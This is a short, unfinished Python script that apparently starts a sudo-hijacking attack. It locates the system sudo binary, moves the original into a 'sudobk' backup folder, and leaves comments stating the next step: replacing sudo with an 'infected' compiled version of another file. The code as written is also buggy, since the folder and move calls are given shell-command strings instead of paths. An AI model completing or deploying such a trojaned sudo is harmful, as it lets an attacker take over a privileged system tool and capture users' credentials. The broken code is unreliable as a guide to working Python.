from shutil import which , move ; from os import mkdir
path = str(which("sudo")) ; bkf = f"{path.replace("sudo","")}/sudobk" ; mkdir(f"mkdir {bkf}") ; move(f"cp {path}",f"{bkf}")
# | 1. GET SUDO PATH
# | 2. create backup folder for sudo
# | 3. copies the og sudo file into the backup folder

# replace PATH sudo file with infected sudo NOTE: COMPILED VERSION OF *compile-me.py*
# TODO: finish tmr, gn
